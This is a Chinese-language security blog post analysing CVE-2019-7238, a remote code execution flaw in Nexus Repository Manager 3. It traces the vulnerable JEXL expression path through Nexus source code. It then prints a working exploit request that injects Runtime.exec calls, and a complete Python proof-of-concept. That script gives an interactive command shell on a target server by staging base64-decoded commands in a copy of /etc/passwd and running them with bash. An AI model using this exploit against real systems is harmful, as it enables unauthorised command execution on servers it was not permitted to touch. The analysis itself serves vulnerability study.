<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>She11c0de&#39;s blogs</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="（CVE-2019-7238）Nexus Repository Manager 远程代码执行一、漏洞简介二、漏洞影响Nexus Repository Manager OSS&#x2F;Pro 3.6.2 版本到 3.14.0 版本 三、复现过程漏洞分析定位到如下位置plugins&#x2F;nexus-coreui-plugin&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;sonatype&#x2F;nexus&#x2F;coreui&#x2F;Comp">
<meta property="og:type" content="article">
<meta property="og:title" content="She11c0de&#39;s blogs">
<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/Nexus/%EF%BC%88CVE-2019-7238%EF%BC%89Nexus%20Repository%20Manager%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/index.html">
<meta property="og:site_name" content="She11c0de&#39;s blogs">
<meta property="og:description" content="（CVE-2019-7238）Nexus Repository Manager 远程代码执行一、漏洞简介二、漏洞影响Nexus Repository Manager OSS&#x2F;Pro 3.6.2 版本到 3.14.0 版本 三、复现过程漏洞分析定位到如下位置plugins&#x2F;nexus-coreui-plugin&#x2F;src&#x2F;main&#x2F;java&#x2F;org&#x2F;sonatype&#x2F;nexus&#x2F;coreui&#x2F;Comp">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2019-7238)NexusRepositoryManager%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId26.jpg">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2019-7238)NexusRepositoryManager%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId27.jpg">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2019-7238)NexusRepositoryManager%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId28.png">
<meta property="og:image" content="https://she11c0de.github.io/resource/(CVE-2019-7238)NexusRepositoryManager%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId30.png">
<meta property="article:published_time" content="2022-07-08T06:26:00.123Z">
<meta property="article:modified_time" content="2022-07-08T07:24:51.670Z">
<meta property="article:author" content="She11c0de">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://she11c0de.github.io/resource/(CVE-2019-7238)NexusRepositoryManager%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId26.jpg">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/css/scrollUp/image.css">

  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
  
<meta name="generator" content="Hexo 5.4.2"></head>
<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <div class="logo">
        <img src="/logo.png" alt="Profile Picture">
      </div>
      <div id="title">She11c0de's blogs</div>
      
       <ul class="my-socials">
  
 
</ul>
    </div>
  </div>
  <div id="header-inner" class="">
    <nav id="main-nav">
      <a id="main-nav-toggle" class="nav-icon"></a>
      <!--
        
          
            <a class="main-nav-link" href="/">首页</a>
          
            <a class="main-nav-link" href="/categories/life">生活</a>
          
            <a class="main-nav-link" href="/archives">归档</a>
          
        
      -->
    </nav>
    <nav id="title-nav" style="display:none">
      <a href="/">She11c0de&#39;s blogs</a>
      <img src="/logo.png" alt="Profile Picture">
      <!--
      <span id="title-nav-socials">
        
       
     </span>
      -->
    </nav>
    <nav id="sub-nav">
      
      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
    </nav>
    <div id="search-form-wrap">
      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
        <input type="submit" value="" class="search-form-submit">
        <input name=tn type=hidden value="bds">
        <input name=cl type=hidden value="3">
        <input name=ct type=hidden value="2097152">
        <input type="hidden" name="si" value="she11c0de.github.io">
      </form>
    </div>
  </div>
  <div class="site-nav" style="display: none;">
    <ul>
      
      
        <li><a href="/">首页</a></li>
      
        <li><a href="/categories/life">生活</a></li>
      
        <li><a href="/archives">归档</a></li>
      
      
    </ul>
  </div>
</header>
      <div class="outer">
        <section id="main"><article id="post-Nexus/（CVE-2019-7238）Nexus Repository Manager 远程代码执行" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2022/07/07/Nexus/%EF%BC%88CVE-2019-7238%EF%BC%89Nexus%20Repository%20Manager%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" class="article-date">
  <time datetime="2022-07-08T06:26:00.123Z" itemprop="datePublished">2022-07-07</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="（CVE-2019-7238）Nexus-Repository-Manager-远程代码执行"><a href="#（CVE-2019-7238）Nexus-Repository-Manager-远程代码执行" class="headerlink" title="（CVE-2019-7238）Nexus Repository Manager 远程代码执行"></a>（CVE-2019-7238）Nexus Repository Manager 远程代码执行</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>Nexus Repository Manager OSS/Pro 3.6.2 版本到 3.14.0 版本</p>
<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>定位到如下位置<br>plugins/nexus-coreui-plugin/src/main/java/org/sonatype/nexus/coreui/ComponentComponent.groovy:185</p>
<pre><code>@Named
@Singleton
@DirectAction(action = &#39;coreui_Component&#39;)
class ComponentComponent
    extends DirectComponentSupport
&#123;
    ...

    @DirectMethod
    @Timed
    @ExceptionMetered
    PagedResponse&lt;AssetXO&gt; previewAssets(final StoreLoadParameters parameters) &#123;

        String repositoryName = parameters.getFilter(&#39;repositoryName&#39;)
        String expression = parameters.getFilter(&#39;expression&#39;)
        String type = parameters.getFilter(&#39;type&#39;)
        // 接收三个参数 repositoryName 、 expression 、 type

        if (!expression || !type || !repositoryName) &#123;
        return null
        &#125;

        // 设置 repositoryName
        RepositorySelector repositorySelector = RepositorySelector.fromSelector(repositoryName)

        // 根据 type 分别调用不同的 validate
        if (type == JexlSelector.TYPE) &#123;
            jexlExpressionValidator.validate(expression)
        &#125;
        else if (type == CselSelector.TYPE) &#123;
            cselExpressionValidator.validate(expression)
        &#125;

        List&lt;Repository&gt; selectedRepositories = getPreviewRepositories(repositorySelector)
        if (!selectedRepositories.size()) &#123;
            return null
        &#125;

        def result = browseService.previewAssets(
            repositorySelector,
            selectedRepositories,
            expression,
            toQueryOptions(parameters))
        return new PagedResponse&lt;AssetXO&gt;(
            result.total,
            result.results.collect(ASSET_CONVERTER.rcurry(null, null, [:], 0)) // buckets not needed for asset preview screen
        )
    &#125; 
    ...
&#125;
</code></pre>
<p>Nexus为了查询方便，特地在jexl的基础上引入了csel表达式。简单起见，这里不做展开。接着我们跟入<code>browseService.previewAssets</code>，接口定义在<br>components/nexus-repository/src/main/java/org/sonatype/nexus/repository/browse/BrowseService.java:59</p>
<pre><code>/**
   * Returns a &#123;@link BrowseResult&#125; for previewing the specified repository based on an arbitrary content selector.
   */
  BrowseResult&lt;Asset&gt; previewAssets(final RepositorySelector selectedRepository,
                                    final List&lt;Repository&gt; repositories,
                                    final String jexlExpression,
                                    final QueryOptions queryOptions);
</code></pre>
<p>具体实现在<br>components/nexus-repository/src/main/java/org/sonatype/nexus/repository/browse/internal/BrowseServiceImpl.java:233</p>
<pre><code>@Named
@Singleton
public class BrowseServiceImpl
    extends ComponentSupport
    implements BrowseService
&#123;
  ...
  @Override
  public BrowseResult&lt;Asset&gt; previewAssets(final RepositorySelector repositorySelector,
                                          final List&lt;Repository&gt; repositories,
                                          final String jexlExpression,
                                          final QueryOptions queryOptions)
  &#123;
    checkNotNull(repositories);
    checkNotNull(jexlExpression);
    final Repository repository = repositories.get(0);
    try (StorageTx storageTx = repository.facet(StorageFacet.class).txSupplier().get()) &#123;
      storageTx.begin();
      List&lt;Repository&gt; previewRepositories;
      if (repositories.size() == 1 &amp;&amp; groupType.equals(repository.getType())) &#123;
        previewRepositories = repository.facet(GroupFacet.class).leafMembers();
      &#125;
      else &#123;
        previewRepositories = repositories;
      &#125;

      PreviewAssetsSqlBuilder builder = new PreviewAssetsSqlBuilder(
          repositorySelector,
          jexlExpression,
          queryOptions,
          getRepoToContainedGroupMap(repositories));

      String whereClause = String.format(&quot;and (%s)&quot;, builder.buildWhereClause());

      //The whereClause is passed in as the querySuffix so that contentExpression will run after repository filtering
      return new BrowseResult&lt;&gt;(
          storageTx.countAssets(null, builder.buildSqlParams(), previewRepositories, whereClause),
          Lists.newArrayList(storageTx.findAssets(null, builder.buildSqlParams(),
              previewRepositories, whereClause + builder.buildQuerySuffix()))
      );
    &#125;
  &#125;
  ...
&#125;
</code></pre>
<p>注意上面代码中的英文注释，大意为<code>whereClause</code>条件在完成<code>repository filtering</code>后将会进行<code>contentExpression</code>。而<code>whereClause</code>是通过前面一系列Builder构建的。可以跟入<code>builder.buildWhereClause()</code>，在<br>components/nexus-repository/src/main/java/org/sonatype/nexus/repository/browse/internal/PreviewAssetsSqlBuilder.java:51<br>， 这里最终引入了contentExpression和jexlExpression:</p>
<pre><code>public class PreviewAssetsSqlBuilder
&#123;
  ...
  public String buildWhereClause() &#123;
    return whereClause(&quot;contentExpression(@this, :jexlExpression, :repositorySelector, &quot; +
        &quot;:repoToContainedGroupMap) == true&quot;, queryOptions.getFilter() != null);
  &#125;
  ...
&#125;
</code></pre>
<p>接下来即考虑如何进一步执行<code>contentExpression</code>。在<br>components/nexus-repository/src/main/java/org/sonatype/nexus/repository/selector/internal/ContentExpressionFunction.java<br>。当<code>contentExpression</code>执行时，会调用<code>execute</code>方法：</p>
<pre><code>public class ContentExpressionFunction
    extends OSQLFunctionAbstract
&#123;
  public static final String NAME = &quot;contentExpression&quot;;
  ...
  @Inject
  public ContentExpressionFunction(final VariableResolverAdapterManager variableResolverAdapterManager,
                                   final SelectorManager selectorManager,
                                   final ContentAuthHelper contentAuthHelper)
  &#123;
    super(NAME, 4, 4);
    this.variableResolverAdapterManager = checkNotNull(variableResolverAdapterManager);
    this.selectorManager = checkNotNull(selectorManager);
    this.contentAuthHelper = checkNotNull(contentAuthHelper);
  &#125;

  @Override
  public Object execute(final Object iThis,
                        final OIdentifiable iCurrentRecord,
                        final Object iCurrentResult,
                        final Object[] iParams,
                        final OCommandContext iContext)
  &#123;
    OIdentifiable identifiable = (OIdentifiable) iParams[0];
    // asset 
    ODocument asset = identifiable.getRecord();
    RepositorySelector repositorySelector = RepositorySelector.fromSelector((String) iParams[2]);
    // jexlExpression 即 iParams[1]
    String jexlExpression = (String) iParams[1];
    List&lt;String&gt; membersForAuth;

    ...

    return contentAuthHelper.checkAssetPermissions(asset, membersForAuth.toArray(new String[membersForAuth.size()])) &amp;&amp;
        checkJexlExpression(asset, jexlExpression, asset.field(AssetEntityAdapter.P_FORMAT, String.class));
  &#125;
</code></pre>
<p>其中的<code>iParams</code>即可对应传入的参数。<code>iParams[0]</code>即<code>@this</code> ,<br><code>iParams[1]</code>即<code>jexlExpression</code>,<br><code>iParams[2]</code>即<code>repositorySelector</code>。在完成初步筛选出<code>asset</code>后进入最后的<code>checkJexlExpression</code></p>
<pre><code>...
  private boolean checkJexlExpression(final ODocument asset,
                                      final String jexlExpression,
                                      final String format)
  &#123;
    VariableResolverAdapter variableResolverAdapter = variableResolverAdapterManager.get(format);
    // variableSource 从 asset 中来
    VariableSource variableSource = variableResolverAdapter.fromDocument(asset);

    SelectorConfiguration selectorConfiguration = new SelectorConfiguration();

    selectorConfiguration.setAttributes(ImmutableMap.of(&quot;expression&quot;, jexlExpression));
    // JexlSelector.TYPE 是常量 定义为 &#39;jexl&#39;
    selectorConfiguration.setType(JexlSelector.TYPE);
    selectorConfiguration.setName(&quot;preview&quot;);

    try &#123;
      // 解析表达式
      return selectorManager.evaluate(selectorConfiguration, variableSource);
    &#125;
    catch (SelectorEvaluationException e) &#123;
      log.debug(&quot;Unable to evaluate expression &#123;&#125;.&quot;, jexlExpression, e);
      return false;
    &#125;
  &#125;

&#125;
</code></pre>
<p><code>selectorConfiguration</code>保存要生成的表达式config。<code>jexlExpression</code>即前面传入的参数。跟入<code>selectorManager.evaluate</code>，在<br>components/nexus-core/src/main/java/org/sonatype/nexus/internal/selector/SelectorManagerImpl.java:156<br>，最终执行了表达式</p>
<pre><code>@Override
  @Guarded(by = STARTED)
  public boolean evaluate(final SelectorConfiguration selectorConfiguration, final VariableSource variableSource)
      throws SelectorEvaluationException
  &#123;
    // 根据传入的 selectorConfiguration 生成对应的 selector 
    // 前面指定了 JexlSelector.TYPE ，这里将生成 JexlSelector
    Selector selector = createSelector(selectorConfiguration);

    try &#123;
      // 调用 selector 的 evaluate 方法
      return selector.evaluate(variableSource);
    &#125;
    catch (Exception e) &#123;
      throw new SelectorEvaluationException(&quot;Selector &#39;&quot; + selectorConfiguration.getName() + &quot;&#39; evaluation in error&quot;,
          e);
    &#125;
  &#125;
</code></pre>
<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>参考官方文档：<a target="_blank" rel="noopener" href="https://help.sonatype.com/repomanager3/configuration/repository-management/#RepositoryManagement-CreatingaQuery">https://help.sonatype.com/repomanager3/configuration/repository-management\#RepositoryManagement-CreatingaQuery</a></p>
<p>其对应接口位置如下图<img src="/resource/(CVE-2019-7238)NexusRepositoryManager%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId26.jpg" alt="3.jpeg">如果是新搭建的环境，为复现成功，还需要先往现有的Repository添加asset。这样在查询确实存在asset后，才会进一步根据<code>whereClause</code>对查询结果asset进行筛选，也才会对<code>whereClause</code>进行表达式解析。不过在实际环境中，Repository中早就各种asset了。下面随便选了一个logging.jar上传。<img src="/resource/(CVE-2019-7238)NexusRepositoryManager%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId27.jpg" alt="4.jpeg"></p>
<pre><code>POST /service/extdirect HTTP/1.1
Host:www.0-sec.org:8081
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0
Content-Type: application/json
Content-Length: 308
Connection: close

&#123;&quot;action&quot;:&quot;coreui_Component&quot;,&quot;method&quot;:&quot;previewAssets&quot;,&quot;data&quot;:[&#123;&quot;page&quot;:1,&quot;start&quot;:0,&quot;limit&quot;:25,&quot;filter&quot;:[&#123;&quot;property&quot;:&quot;repositoryName&quot;,&quot;value&quot;:&quot;*&quot;&#125;,&#123;&quot;property&quot;:&quot;expression&quot;,&quot;value&quot;:&quot;&#39;&#39;.class.forName(&#39;java.lang.Runtime&#39;).getRuntime().exec(&#39;calc.exe&#39;)&quot;&#125;,&#123;&quot;property&quot;:&quot;type&quot;,&quot;value&quot;:&quot;jexl&quot;&#125;]&#125;],&quot;type&quot;:&quot;rpc&quot;,&quot;tid&quot;:4&#125;
</code></pre>
<p><img src="/resource/(CVE-2019-7238)NexusRepositoryManager%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId28.png" alt="1.png"></p>
<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><pre><code>cve-2019-7238.py
</code></pre>
<p><img src="/resource/(CVE-2019-7238)NexusRepositoryManager%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/media/rId30.png" alt="2.png"></p>
<pre><code>from requests.packages.urllib3.exceptions import InsecureRequestWarning
import urllib3
import requests
import base64
import json
import sys

print(&quot;\nNexus Repository Manager 3 Remote Code Execution - CVE-2019-7238 \nFound by @Rico and @voidfyoo\n&quot;)

proxy = &#123;
&#125;

remote = &#39;http://127.0.0.1:8081&#39;

ARCH=&quot;LINUX&quot;
# ARCH=&quot;WIN&quot;

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def checkSuccess(r):
    if r.status_code == 200:
        json_data = json.loads(r.text)
        if json_data[&#39;result&#39;][&#39;total&#39;] &gt; 0:
            print(&quot;OK&quot;)
        else:
            print(&quot;KO&quot;)
            sys.exit()
    else:
        print(&quot;[-] Error status code&quot;, r.status_code)
        sys.exit()


print(&quot;[+] Checking if Content-Selectors exist =&gt;&quot;, end=&#39; &#39;)
burp0_url = remote + &quot;/service/extdirect&quot;
burp0_headers = &#123;&quot;Content-Type&quot;: &quot;application/json&quot;&#125;
burp0_json = &#123;&quot;action&quot;: &quot;coreui_Component&quot;, &quot;data&quot;: [&#123;&quot;filter&quot;: [&#123;&quot;property&quot;: &quot;repositoryName&quot;, &quot;value&quot;: &quot;*&quot;&#125;, &#123;&quot;property&quot;: &quot;expression&quot;, &quot;value&quot;: &quot;1==1&quot;&#125;, &#123;
    &quot;property&quot;: &quot;type&quot;, &quot;value&quot;: &quot;jexl&quot;&#125;], &quot;limit&quot;: 50, &quot;page&quot;: 1, &quot;sort&quot;: [&#123;&quot;direction&quot;: &quot;ASC&quot;, &quot;property&quot;: &quot;name&quot;&#125;], &quot;start&quot;: 0&#125;], &quot;method&quot;: &quot;previewAssets&quot;, &quot;tid&quot;: 18, &quot;type&quot;: &quot;rpc&quot;&#125;
r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json,
              proxies=proxy, verify=False, allow_redirects=False)
checkSuccess(r)
print(&quot;&quot;)

while True:
    try:
        if ARCH == &quot;LINUX&quot;:
            command = input(&quot;command (not reflected)&gt; &quot;)
            command = base64.b64encode(command.encode(&#39;utf-8&#39;))
            command_str = command.decode(&#39;utf-8&#39;)
            command_str = command_str.replace(&#39;/&#39;, &#39;+&#39;)

            print(&quot;[+] Copy file to temp directory =&gt;&quot;, end=&#39; &#39;)

            burp0_url = remote + &quot;/service/extdirect&quot;
            burp0_headers = &#123;&quot;Content-Type&quot;: &quot;application/json&quot;&#125;
            burp0_json = &#123;&quot;action&quot;: &quot;coreui_Component&quot;, &quot;data&quot;: [&#123;&quot;filter&quot;: [&#123;&quot;property&quot;: &quot;repositoryName&quot;, &quot;value&quot;: &quot;*&quot;&#125;, &#123;&quot;property&quot;: &quot;expression&quot;, &quot;value&quot;: &quot;1==0 or &#39;&#39;.class.forName(&#39;java.lang.Runtime&#39;).getRuntime().exec(\&quot;cp /etc/passwd  /tmp/passwd\&quot;)&quot;&#125;, &#123; &quot;property&quot;: &quot;type&quot;, &quot;value&quot;: &quot;jexl&quot;&#125;], &quot;limit&quot;: 50, &quot;page&quot;: 1, &quot;sort&quot;: [&#123;&quot;direction&quot;: &quot;ASC&quot;, &quot;property&quot;: &quot;name&quot;&#125;], &quot;start&quot;: 0&#125;], &quot;method&quot;: &quot;previewAssets&quot;, &quot;tid&quot;: 18, &quot;type&quot;: &quot;rpc&quot;&#125;
            r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, proxies=proxy, verify=False, allow_redirects=False)
            checkSuccess(r)

            print(&quot;[+] Preparing temp file =&gt;&quot;, end=&#39; &#39;)
            burp0_url = remote + &quot;/service/extdirect&quot;
            burp0_headers = &#123;&quot;Content-Type&quot;: &quot;application/json&quot;&#125;
            burp0_json = &#123;&quot;action&quot;: &quot;coreui_Component&quot;, &quot;data&quot;: [&#123;&quot;filter&quot;: [&#123;&quot;property&quot;: &quot;repositoryName&quot;, &quot;value&quot;: &quot;*&quot;&#125;, &#123;&quot;property&quot;: &quot;expression&quot;, &quot;value&quot;: &quot;1==0 or &#39;&#39;.class.forName(&#39;java.lang.Runtime&#39;).getRuntime().exec(\&quot;sed -i 1cpwn2  /tmp/passwd\&quot;)&quot;&#125;, &#123;
                &quot;property&quot;: &quot;type&quot;, &quot;value&quot;: &quot;jexl&quot;&#125;], &quot;limit&quot;: 50, &quot;page&quot;: 1, &quot;sort&quot;: [&#123;&quot;direction&quot;: &quot;ASC&quot;, &quot;property&quot;: &quot;name&quot;&#125;], &quot;start&quot;: 0&#125;], &quot;method&quot;: &quot;previewAssets&quot;, &quot;tid&quot;: 18, &quot;type&quot;: &quot;rpc&quot;&#125;
            r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, proxies=proxy,
                        verify=False, allow_redirects=False)
            checkSuccess(r)

            print(&quot;[+] Cleaning temp file =&gt;&quot;, end=&#39; &#39;)
            burp0_url = remote + &quot;/service/extdirect&quot;
            burp0_headers = &#123;&quot;Content-Type&quot;: &quot;application/json&quot;&#125;
            burp0_json = &#123;&quot;action&quot;: &quot;coreui_Component&quot;, &quot;data&quot;: [&#123;&quot;filter&quot;: [&#123;&quot;property&quot;: &quot;repositoryName&quot;, &quot;value&quot;: &quot;*&quot;&#125;, &#123;&quot;property&quot;: &quot;expression&quot;, &quot;value&quot;: &quot;1==0 or &#39;&#39;.class.forName(&#39;java.lang.Runtime&#39;).getRuntime().exec(\&quot;sed -i /[^pwn2]/d /tmp/passwd\&quot;)&quot;&#125;, &#123;
                &quot;property&quot;: &quot;type&quot;, &quot;value&quot;: &quot;jexl&quot;&#125;], &quot;limit&quot;: 50, &quot;page&quot;: 1, &quot;sort&quot;: [&#123;&quot;direction&quot;: &quot;ASC&quot;, &quot;property&quot;: &quot;name&quot;&#125;], &quot;start&quot;: 0&#125;], &quot;method&quot;: &quot;previewAssets&quot;, &quot;tid&quot;: 18, &quot;type&quot;: &quot;rpc&quot;&#125;
            r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, proxies=proxy,
                            verify=False, allow_redirects=False)
            checkSuccess(r)

            print(&quot;[+] Writing command into temp file =&gt;&quot;, end=&#39; &#39;)
            burp0_url = remote + &quot;/service/extdirect&quot;
            burp0_headers = &#123;&quot;Content-Type&quot;: &quot;application/json&quot;&#125;
            burp0_json = &#123;&quot;action&quot;: &quot;coreui_Component&quot;, &quot;data&quot;: [&#123;&quot;filter&quot;: [&#123;&quot;property&quot;: &quot;repositoryName&quot;, &quot;value&quot;: &quot;*&quot;&#125;, &#123;&quot;property&quot;: &quot;expression&quot;, &quot;value&quot;: &quot;1==0 or &#39;&#39;.class.forName(&#39;java.lang.Runtime&#39;).getRuntime().exec(\&quot;sed -i 1s/pwn2/&#123;echo,&quot; + command_str + &quot;&#125;|&#123;base64,-d&#125;&gt;pwn.txt/g /tmp/passwd\&quot;)&quot;&#125;, &#123;
                &quot;property&quot;: &quot;type&quot;, &quot;value&quot;: &quot;jexl&quot;&#125;], &quot;limit&quot;: 50, &quot;page&quot;: 1, &quot;sort&quot;: [&#123;&quot;direction&quot;: &quot;ASC&quot;, &quot;property&quot;: &quot;name&quot;&#125;], &quot;start&quot;: 0&#125;], &quot;method&quot;: &quot;previewAssets&quot;, &quot;tid&quot;: 18, &quot;type&quot;: &quot;rpc&quot;&#125;
            r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, proxies=proxy,
                            verify=False, allow_redirects=False)
            checkSuccess(r)

            print(&quot;[+] Decode base64 command =&gt;&quot;, end=&#39; &#39;)
            burp0_url = remote + &quot;/service/extdirect&quot;
            burp0_headers = &#123;&quot;Content-Type&quot;: &quot;application/json&quot;&#125;
            burp0_json = &#123;&quot;action&quot;: &quot;coreui_Component&quot;, &quot;data&quot;: [&#123;&quot;filter&quot;: [&#123;&quot;property&quot;: &quot;repositoryName&quot;, &quot;value&quot;: &quot;*&quot;&#125;, &#123;&quot;property&quot;: &quot;expression&quot;, &quot;value&quot;: &quot;1==0 or &#39;&#39;.class.forName(&#39;java.lang.Runtime&#39;).getRuntime().exec(\&quot;bash /tmp/passwd\&quot;)&quot;&#125;, &#123;
                &quot;property&quot;: &quot;type&quot;, &quot;value&quot;: &quot;jexl&quot;&#125;], &quot;limit&quot;: 50, &quot;page&quot;: 1, &quot;sort&quot;: [&#123;&quot;direction&quot;: &quot;ASC&quot;, &quot;property&quot;: &quot;name&quot;&#125;], &quot;start&quot;: 0&#125;], &quot;method&quot;: &quot;previewAssets&quot;, &quot;tid&quot;: 18, &quot;type&quot;: &quot;rpc&quot;&#125;
            r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, proxies=proxy,
                            verify=False, allow_redirects=False)
            checkSuccess(r)

            print(&quot;[+] Executing command =&gt;&quot;, end=&#39; &#39;)
            burp0_url = remote + &quot;/service/extdirect&quot;
            burp0_headers = &#123;&quot;Content-Type&quot;: &quot;application/json&quot;&#125;
            burp0_json = &#123;&quot;action&quot;: &quot;coreui_Component&quot;, &quot;data&quot;: [&#123;&quot;filter&quot;: [&#123;&quot;property&quot;: &quot;repositoryName&quot;, &quot;value&quot;: &quot;*&quot;&#125;, &#123;&quot;property&quot;: &quot;expression&quot;, &quot;value&quot;: &quot;1==0 or &#39;&#39;.class.forName(&#39;java.lang.Runtime&#39;).getRuntime().exec(\&quot;bash pwn.txt\&quot;)&quot;&#125;, &#123;
                &quot;property&quot;: &quot;type&quot;, &quot;value&quot;: &quot;jexl&quot;&#125;], &quot;limit&quot;: 50, &quot;page&quot;: 1, &quot;sort&quot;: [&#123;&quot;direction&quot;: &quot;ASC&quot;, &quot;property&quot;: &quot;name&quot;&#125;], &quot;start&quot;: 0&#125;], &quot;method&quot;: &quot;previewAssets&quot;, &quot;tid&quot;: 18, &quot;type&quot;: &quot;rpc&quot;&#125;
            r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, proxies=proxy,
                            verify=False, allow_redirects=False)
            checkSuccess(r)
            print(&#39;&#39;)

        else:
            command = input(&quot;command (not reflected)&gt; &quot;)
            print(&quot;[+] Executing command =&gt;&quot;, end=&#39; &#39;)
            burp0_url = remote + &quot;/service/extdirect&quot;
            burp0_headers = &#123;&quot;Content-Type&quot;: &quot;application/json&quot;&#125;
            burp0_json = &#123;&quot;action&quot;: &quot;coreui_Component&quot;, &quot;data&quot;: [&#123;&quot;filter&quot;: [&#123;&quot;property&quot;: &quot;repositoryName&quot;, &quot;value&quot;: &quot;*&quot;&#125;, &#123;&quot;property&quot;: &quot;expression&quot;, &quot;value&quot;: &quot;1==0 or &#39;&#39;.class.forName(&#39;java.lang.Runtime&#39;).getRuntime().exec(\&quot;&quot; + command + &quot;\&quot;)&quot;&#125;, &#123;
                &quot;property&quot;: &quot;type&quot;, &quot;value&quot;: &quot;jexl&quot;&#125;], &quot;limit&quot;: 50, &quot;page&quot;: 1, &quot;sort&quot;: [&#123;&quot;direction&quot;: &quot;ASC&quot;, &quot;property&quot;: &quot;name&quot;&#125;], &quot;start&quot;: 0&#125;], &quot;method&quot;: &quot;previewAssets&quot;, &quot;tid&quot;: 18, &quot;type&quot;: &quot;rpc&quot;&#125;
            r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, proxies=proxy,
                              verify=False, allow_redirects=False)
            checkSuccess(r)
            print(&#39;&#39;)

    except KeyboardInterrupt:
        print(&quot;Exiting...&quot;)
        break
</code></pre>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4136">https://xz.aliyun.com/t/4136</a></p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/34e450debe0f">https://www.jianshu.com/p/34e450debe0f</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/mpgn/CVE-2019-7238">https://github.com/mpgn/CVE-2019-7238</a></p>
</blockquote>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="https://she11c0de.github.io/2022/07/07/Nexus/%EF%BC%88CVE-2019-7238%EF%BC%89Nexus%20Repository%20Manager%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" data-id="cl5c2qsys00c9y8v1c7gyh2me" class="article-share-link">分享到</a>
      

      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2022/07/07/Nexus/%EF%BC%88CVE-2020-10199%EF%BC%89Nexus%20Repository%20Manager%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          (no title)
        
      </div>
    </a>
  
  
    <a href="/2022/07/07/Nexus/%EF%BC%88CVE-2019-5475%EF%BC%89Nexus2%20yum%E6%8F%92%E4%BB%B6RCE%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title"></div>
    </a>
  
</nav>

  
</article>

</section>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2022 She11c0de<br>
      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
